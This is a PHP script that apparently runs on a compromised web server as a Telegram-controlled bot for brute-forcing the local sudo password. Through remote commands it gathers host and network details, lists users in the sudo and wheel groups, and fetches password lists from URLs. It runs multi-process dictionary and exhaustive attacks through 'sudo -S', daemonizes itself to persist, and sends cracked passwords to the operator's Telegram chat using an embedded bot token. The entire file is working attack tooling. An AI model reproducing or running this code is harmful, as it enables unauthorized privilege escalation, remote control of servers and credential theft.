<?php
set_time_limit(0);
ignore_user_abort(true);

// --- CONFIGURATION ---
$botToken = "8496895161:AAHVskbIVil_Pqh8MalgtGPdyRFAcjJrFeE";
$telegramApiUrl = "https://api.telegram.org/bot" . $botToken;

// --- STATE FILES ---
define('PID_FILE', sys_get_temp_dir() . '/cracker.pid');
define('STATUS_FILE', sys_get_temp_dir() . '/cracker_status.json');
define('LOG_FILE', sys_get_temp_dir() . '/cracker_bot.log');
define('BOT_PID_FILE', sys_get_temp_dir() . '/bot.pid'); // NEW LINE FOR BOT'S PID

// Initial Daemon Check/Setup
if (file_exists(BOT_PID_FILE)) {
    $existingPid = (int)file_get_contents(BOT_PID_FILE);
    if (posix_getsid($existingPid) !== false) { // Check if process is running
        // If this is not the daemonized child, and another instance is running, exit.
        if (getmypid() !== $existingPid) { // This check prevents the daemonized child from exiting
            error_log("Another bot instance is already running with PID: $existingPid. Exiting.");
            exit(1);
        }
    } else {
        // Stale PID file, clean it up
        @unlink(BOT_PID_FILE);
    }
}
// Write current PID to file. This will be updated if daemonized.
file_put_contents(BOT_PID_FILE, getmypid());

// Register shutdown function to clean up PID file
register_shutdown_function(function() {
    if (file_exists(BOT_PID_FILE) && (int)file_get_contents(BOT_PID_FILE) === getmypid()) {
        @unlink(BOT_PID_FILE);
        log_message("Bot PID file cleaned up.");
    }
});

// --- HELPER FUNCTIONS ---

function log_message($message) {
    file_put_contents(LOG_FILE, date('[Y-m-d H:i:s] ') . $message . "\n", FILE_APPEND);
}

function sendMessage($chatId, $text, $replyToMessageId = null) {
    global $telegramApiUrl;
    $url = $telegramApiUrl . "/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'Markdown'
    ];
    if ($replyToMessageId) {
        $postFields['reply_to_message_id'] = $replyToMessageId;
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postFields));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

function getUpdates($offset) {
    global $telegramApiUrl;
    $url = $telegramApiUrl . "/getUpdates?offset=" . $offset . "&timeout=60";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    return json_decode($result, true);
}

function handleCommand($chatId, $command, $messageId) {
    $parts = explode(' ', $command);
    $cmd = $parts[0];

    switch ($cmd) {
        case '/start':
            $welcomeText = "🔥 *Sudo Brute Forcer Bot* 🔥\n\n";
            $welcomeText .= "Bot is online and ready to receive commands.\n\n";
            $welcomeText .= "Use /help to see the list of available commands.";
            sendMessage($chatId, $welcomeText, $messageId);
            break;

        case '/help':
            $helpText = "*Available Commands:*
\n";
            $helpText .= "`/start` - Check if the bot is online.\n";
            $helpText .= "`/info` - Get target server information.\n";
            $helpText .= "`/crack [url] [workers]` - (Dictionary Attack) Crack sudo password from a password list URL.\n";
            $helpText .= "`/bruteforce [charset] [min] [max] [workers]` - (Brute-Force Attack) Try all password combinations.\n";
            $helpText .= "    `[charset]` can use ranges like `a-z`, `A-Z`, `0-9`.\n";
            $helpText .= "`/stop` - Stop the current cracking process.\n";
            $helpText .= "`/findsudoers` - Find all users with sudo privileges.\n";
            $helpText .= "`/lock` - Daemonize the bot to run in background (like nohup).\n";
            sendMessage($chatId, $helpText, $messageId);
            break;

        case '/info':
            sendMessage($chatId, "🔍 Gathering server information...", $messageId);

            $info = "*-- System Information --*\n\n";
            $info .= "*OS:* `" . php_uname() . "`\n";
            $info .= "*Hostname:* `" . gethostname() . "`\n";
            $info .= "*Web User:* `" . get_current_user() . "`\n";
            $shellUser = trim(shell_exec("whoami"));
            $info .= "*Shell User:* `" . ($shellUser ?: 'N/A') . "`\n";
            $info .= "*PHP Version:* `" . phpversion() . "`\n";
            $info .= "*Current Dir:* `" . getcwd() . "`\n\n";

            $info .= "*-- Network --*\n";
            $ip = shell_exec("ip a | grep 'inet '");
            $info .= "```\n" . ($ip ?: 'Could not get IP info') . "\n```\n\n";

            $info .= "*-- Sudo & Cracking --*\n";
            $sudoVer = shell_exec("sudo -V 2>&1");
            $info .= "*Sudo Version:*\n```\n" . ($sudoVer ?: 'Sudo not found or error') . "\n```\n";
            
            $pcntlLoaded = function_exists('pcntl_fork');
            $info .= "*Multiprocessing:* " . ($pcntlLoaded ? '✅ Enabled' : '❌ Disabled') . "\n";
            if (!$pcntlLoaded) {
                $info .= "  (Cracking will be much slower)\n";
            }

            sendMessage($chatId, $info, $messageId);
            break;

        case '/crack':
            SudoCracker::handleCrackCommand($chatId, $messageId, $parts);
            break;

        case '/bruteforce':
            SudoCracker::handleBruteforceCommand($chatId, $messageId, $parts);
            break;

        case '/status':
            SudoCracker::handleStatusCommand($chatId, $messageId);
            break;
        
        case '/stop':
            SudoCracker::handleStopCommand($chatId, $messageId);
            break;

        case '/findsudoers':
            $response = "🕵️ *Sudo Users Search*\n\n";
            $sudoers = [];
            $groupFile = '/etc/group';

            if (!is_readable($groupFile)) {
                $response .= "❌ Could not read `$groupFile`.";
            } else {
                $lines = file($groupFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
                foreach ($lines as $line) {
                    if (strpos($line, 'sudo:') === 0 || strpos($line, 'wheel:') === 0) {
                        $parts = explode(':', $line);
                        if (count($parts) === 4 && !empty($parts[3])) {
                            $users = explode(',', $parts[3]);
                            foreach ($users as $user) {
                                $sudoers[trim($user)] = true;
                            }
                        }
                    }
                }
                
                if (empty($sudoers)) {
                    $response .= "No users found in `sudo` or `wheel` groups.";
                } else {
                    $response .= "Found the following potential sudo users:\n";
                    foreach (array_keys($sudoers) as $user) {
                        $response .= "- `$user`\n";
                    }
                }
            }
            sendMessage($chatId, $response, $messageId);
            break;

        case '/lock': // NEW /LOCK COMMAND IMPLEMENTATION
            if (!function_exists('pcntl_fork')) {
                sendMessage($chatId, "❌ Multiprocessing (`pcntl_fork`) is not enabled on this server. Cannot daemonize.", $messageId);
                log_message("PCNTL extension not enabled, cannot daemonize.");
                break;
            }

            // Check if already daemonized (by checking if this is the child process that will continue)
            if (file_exists(BOT_PID_FILE) && (int)file_get_contents(BOT_PID_FILE) === getmypid()) {
                sendMessage($chatId, "✅ Bot is already running in background (PID: `" . getmypid() . "`).", $messageId);
                break;
            }

            sendMessage($chatId, "🔒 Locking bot to run in background (daemonizing)...", $messageId);

            $pid = pcntl_fork();
            if ($pid == -1) {
                sendMessage($chatId, "❌ Could not fork process to daemonize.", $messageId);
                log_message("Failed to fork for daemonization.");
            } else if ($pid) {
                // Parent process (original script instance)
                log_message("Parent process (PID: " . getmypid() . ") exiting, child process (PID: $pid) taking over as daemon.");
                exit(0); // Parent exits, child continues
            } else {
                // Child process (new daemonized instance)
                posix_setsid(); // Detach from the controlling terminal

                // Close standard file descriptors (optional but good practice for daemons)
                fclose(STDIN);
                fclose(STDOUT);
                fclose(STDERR);
                
                // Update PID file with new daemon's PID
                file_put_contents(BOT_PID_FILE, getmypid());
                log_message("Bot daemonized successfully with PID: " . getmypid() . ". Main loop continues.");
                // The main bot loop will continue from here in the child process.
            }
            break; // This break is for the switch, but the parent will exit before this.
            
        default:
            sendMessage($chatId, "Unknown command: `$cmd`\nUse /help for commands.", $messageId);
            break;
    }
}

class SudoCracker {
    
    private static function trySudo($password) {
        $escaped_password = escapeshellarg($password);
        $commands = [
            "echo $escaped_password | sudo -S whoami 2>/dev/null",
            "echo $escaped_password | sudo -S id 2>/dev/null",
        ];
        
        foreach ($commands as $cmd) {
            exec($cmd, $output, $returnCode);
            if ($returnCode === 0) {
                $outputText = implode("\n", $output);
                // Double check the output to ensure we are root
                if (strpos($outputText, 'root') !== false || strpos($outputText, 'uid=0') !== false) {
                    return true;
                }
            }
            // Reset output for next command
            $output = [];
        }
        
        return false;
    }

    private static function updateStatus($statusData) {
        $fp = fopen(STATUS_FILE, 'c');
        if (flock($fp, LOCK_EX)) {
            ftruncate($fp, 0);
            fwrite($fp, json_encode($statusData));
            fflush($fp);
            flock($fp, LOCK_UN);
        }
        fclose($fp);
    }
    
    private static function getStatus() {
        if (!file_exists(STATUS_FILE)) return null;
        $fp = fopen(STATUS_FILE, 'r');
        if (flock($fp, LOCK_SH)) {
            $jsonData = stream_get_contents($fp);
            flock($fp, LOCK_UN);
            fclose($fp);
            return json_decode($jsonData, true);
        }
        fclose($fp);
        return null;
    }

    public static function handleStopCommand($chatId, $messageId) {
        if (!file_exists(PID_FILE)) {
            sendMessage($chatId, "❌ No cracking process is currently running.", $messageId);
            return;
        }
        $pid = (int)file_get_contents(PID_FILE);
        if (posix_kill($pid, SIGKILL)) {
            sendMessage($chatId, "✅ Cracking process (PID: $pid) stopped.", $messageId);
        } else {
            sendMessage($chatId, "⚠️ Could not stop process (PID: $pid). It may have already finished.", $messageId);
        }
        @unlink(PID_FILE);
        @unlink(STATUS_FILE);
    }

    public static function handleStatusCommand($chatId, $messageId) {
        $status = self::getStatus();
        if (!$status || !file_exists(PID_FILE)) {
            sendMessage($chatId, "ℹ️ No cracking process is running.", $messageId);
            return;
        }

        $elapsed = time() - ($status['start_time'] ?? time());
        $rate = ($elapsed > 0) ? ($status['attempted'] ?? 0) / $elapsed : 0;
        $user = $status['username'] ?? 'N/A';
        $mode = $status['mode'] ?? 'N/A';
        $progressText = "";

        if ($mode === 'dictionary') {
            $total = $status['total_passwords'] ?? 0;
            $attempted = $status['attempted'] ?? 0;
            $percentage = ($total > 0) ? ($attempted / $total) * 100 : 0;
            $progressText = "Progress: " . sprintf('%.2f%%', $percentage) . "\n";
            $progressText .= "Attempted: `{$attempted} / {$total}`\n";
        } else { // bruteforce
            $attempted = $status['attempted'] ?? 0;
            $progressText = "Attempted: `{$attempted}`\n";
            $last_tried = $status['last_tried'] ?? 'N/A';
            $progressText .= "Last Tried: `{$last_tried}`\n";
        }

        $responseText = "📊 *Cracking Status for `{$user}`*\n\n";
        $responseText .= "Mode: `{$mode}`\n";
        $responseText .= "PID: `{$status['pid']}`\n";
        $responseText .= $progressText;
        $responseText .= "Passwords/sec: `" . sprintf('%.2f', $rate) . "`\n";
        $responseText .= "Elapsed Time: `" . gmdate("H:i:s", $elapsed) . "`\n";
        
        if (!empty($status['found'])) {
             $responseText .= "\n🎉 *SUCCESS!* Password for user `{$user}` found: `{$status['password']}`";
        }

        sendMessage($chatId, $responseText, $messageId);
    }

    public static function handleCrackCommand($chatId, $messageId, $parts) {
        if (file_exists(PID_FILE)) {
            sendMessage($chatId, "⚠️ A cracking process is already running. Use /stop first.", $messageId);
            return;
        }
        if (!function_exists('pcntl_fork')) {
            sendMessage($chatId, "❌ Multiprocessing is not enabled.", $messageId);
            return;
        }
        if (count($parts) < 2) {
            sendMessage($chatId, "Usage: `/crack [url] [workers]`", $messageId);
            return;
        }

        $passwordUrl = $parts[1];
        $numWorkers = isset($parts[2]) ? intval($parts[2]) : 4;
        if ($numWorkers <= 0) $numWorkers = 4;

        sendMessage($chatId, "🚀 Starting dictionary attack...\n- URL: `$passwordUrl`\n- Workers: `$numWorkers`", $messageId);
        $passwords = @file($passwordUrl, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if ($passwords === false || empty($passwords)) {
            sendMessage($chatId, "❌ Failed to download or read passwords from URL.", $messageId);
            return;
        }

        $pid = pcntl_fork();
        if ($pid == -1) {
            sendMessage($chatId, "❌ Could not fork process.", $messageId);
        } else if ($pid) {
            file_put_contents(PID_FILE, $pid);
            $status = [
                'pid' => $pid, 'mode' => 'dictionary', 'status' => 'running', 'start_time' => time(),
                'username' => trim(shell_exec('whoami')), 'total_passwords' => count($passwords),
                'attempted' => 0, 'found' => false, 'password' => null
            ];
            self::updateStatus($status);
            sendMessage($chatId, "✅ Dictionary attack started in background with PID: `$pid`\nUse /status to check progress.", $messageId);
        } else {
            self::runCrackerManager($chatId, $passwords, $numWorkers);
        }
    }

    private static function runCrackerManager($chatId, $passwords, $numWorkers) {
        posix_setsid();
        $totalPasswords = count($passwords);
        $passwordsPerWorker = ceil($totalPasswords / $numWorkers);
        $workerPids = [];
        for ($i = 0; $i < $numWorkers; $i++) {
            $workerPasswords = array_slice($passwords, $i * $passwordsPerWorker, $passwordsPerWorker);
            if (empty($workerPasswords)) continue;
            $worker_pid = pcntl_fork();
            if ($worker_pid > 0) {
                $workerPids[] = $worker_pid;
            } else { 
                self::runWorker($workerPasswords);
                exit(0);
            }
        }
        self::waitForWorkersAndReport($chatId, $workerPids);
    }
    
    private static function runWorker($passwords) {
        foreach ($passwords as $password) {
            $status = self::getStatus() ?? [];
            if (!empty($status['found'])) exit(0);

            if (self::trySudo($password)) {
                $status = self::getStatus() ?? [];
                if (empty($status['found'])) {
                    $status['found'] = true;
                    $status['password'] = $password;
                    $status['attempted'] = ($status['attempted'] ?? 0) + 1;
                    self::updateStatus($status);
                }
                exit(0);
            }
            $status['attempted'] = ($status['attempted'] ?? 0) + 1;
            self::updateStatus($status);
        }
        exit(0);
    }
    
    public static function handleBruteforceCommand($chatId, $messageId, $parts) {
        if (file_exists(PID_FILE)) {
            sendMessage($chatId, "⚠️ A cracking process is already running.", $messageId);
            return;
        }
        if (!function_exists('pcntl_fork')) {
            sendMessage($chatId, "❌ Multiprocessing is not enabled.", $messageId);
            return;
        }
        if (count($parts) < 4) {
            sendMessage($chatId, "Usage: `/bruteforce [charset] [min] [max] [workers]`", $messageId);
            return;
        }

        $charsetStr = $parts[1];
        $minLen = (int)$parts[2];
        $maxLen = (int)$parts[3];
        $numWorkers = isset($parts[4]) ? intval($parts[4]) : 4;
        
        $charset = self::parseCharset($charsetStr);
        if (empty($charset) || $minLen <= 0 || $maxLen < $minLen) {
            sendMessage($chatId, "❌ Invalid arguments. Check charset, min/max length.", $messageId);
            return;
        }

        sendMessage($chatId, "🚀 Starting brute-force attack...\n- Charset Size: `" . count($charset) . "`\n- Length: `$minLen-$maxLen`\n- Workers: `$numWorkers`", $messageId);

        $pid = pcntl_fork();
        if ($pid == -1) {
            sendMessage($chatId, "❌ Could not fork process.", $messageId);
        } else if ($pid) {
            file_put_contents(PID_FILE, $pid);
            $status = [
                'pid' => $pid, 'mode' => 'bruteforce', 'status' => 'running', 'start_time' => time(),
                'username' => trim(shell_exec('whoami')), 'charset' => $charset, 'minLen' => $minLen,
                'maxLen' => $maxLen, 'attempted' => 0, 'found' => false, 'password' => null
            ];
            self::updateStatus($status);
            sendMessage($chatId, "✅ Brute-force attack started in background with PID: `$pid`.", $messageId);
        } else {
            self::runBruteforceManager($chatId, $charset, $minLen, $maxLen, $numWorkers);
        }
    }

    private static function runBruteforceManager($chatId, $charset, $minLen, $maxLen, $numWorkers) {
        posix_setsid();
        $workerPids = [];
        $workload = array_chunk($charset, ceil(count($charset) / $numWorkers));

        foreach ($workload as $prefixes) {
            if (empty($prefixes)) continue;
            $worker_pid = pcntl_fork();
            if ($worker_pid > 0) {
                $workerPids[] = $worker_pid;
            } else {
                self::runGeneratorWorker($prefixes, $charset, $minLen, $maxLen);
                exit(0);
            }
        }
        self::waitForWorkersAndReport($chatId, $workerPids);
    }

    private static function runGeneratorWorker($prefixes, $charset, $minLen, $maxLen) {
        foreach ($prefixes as $prefix) {
            self::generateAndCheck($prefix, $charset, $minLen, $maxLen);
        }
    }

    private static function generateAndCheck($current, $charset, $minLen, $maxLen) {
        $len = strlen($current);
        if ($len >= $minLen) {
            $status = self::getStatus() ?? [];
            if (!empty($status['found'])) exit(0);

            if (self::trySudo($current)) {
                $status = self::getStatus() ?? [];
                if (empty($status['found'])) {
                    $status['found'] = true;
                    $status['password'] = $current;
                    $status['attempted'] = ($status['attempted'] ?? 0) + 1;
                    self::updateStatus($status);
                }
                exit(0);
            }
            $status['attempted'] = ($status['attempted'] ?? 0) + 1;
            $status['last_tried'] = $current;
            self::updateStatus($status);
        }
        if ($len < $maxLen) {
            foreach ($charset as $char) {
                self::generateAndCheck($current . $char, $charset, $minLen, $maxLen);
            }
        }
    }

    private static function parseCharset($str) {
        $chars = [];
        $str = preg_replace_callback('/(.)-(.)/', function($m) {
            return implode('', range($m[1], $m[2]));
        }, $str);
        return str_split(count_chars($str, 3));
    }
    
    private static function waitForWorkersAndReport($chatId, $workerPids) {
        while (count($workerPids) > 0) {
            foreach ($workerPids as $key => $pid) {
                if (pcntl_waitpid($pid, $status, WNOHANG) > 0) {
                    unset($workerPids[$key]);
                }
            }
            $currentStatus = self::getStatus() ?? [];
            if (!empty($currentStatus['found'])) {
                foreach ($workerPids as $pid) {
                    posix_kill($pid, SIGKILL);
                }
                break;
            }
            sleep(1);
        }

        $finalStatus = self::getStatus() ?? [];
        $user = $finalStatus['username'] ?? 'N/A';
        if (!empty($finalStatus['found'])) {
            $report = "🎉🎉 *SUCCESS!* 🎉🎉\n\nPassword for user `{$user}` found: `{$finalStatus['password']}`";
            sendMessage($chatId, $report);
        } else {
            $report = "❌ *FAILURE*\n\nPassword for user `{$user}` not found in this session.";
            sendMessage($chatId, $report);
        }
        @unlink(PID_FILE);
        @unlink(STATUS_FILE);
        exit(0);
    }
}

// --- MAIN BOT LOOP ---

log_message("Bot started.");
$updateOffset = 0;

while (true) {
    $updates = getUpdates($updateOffset + 1);

    if (isset($updates['result'])) {
        foreach ($updates['result'] as $update) {
            $updateOffset = $update['update_id'];
            
            if (isset($update['message']['text'])) {
                $message = $update['message'];
                $chatId = $message['chat']['id'];
                $text = $message['text'];
                $messageId = $message['message_id'];

                if (strpos($text, '/') === 0) { // It's a command
                    log_message("Received command '$text' from chat $chatId");
                    handleCommand($chatId, $text, $messageId);
                }
            }
        }
    }
    
    // Small delay to prevent spamming Telegram API in case of rapid loops
    usleep(100000); // 0.1 seconds
}

log_message("Bot stopped.");

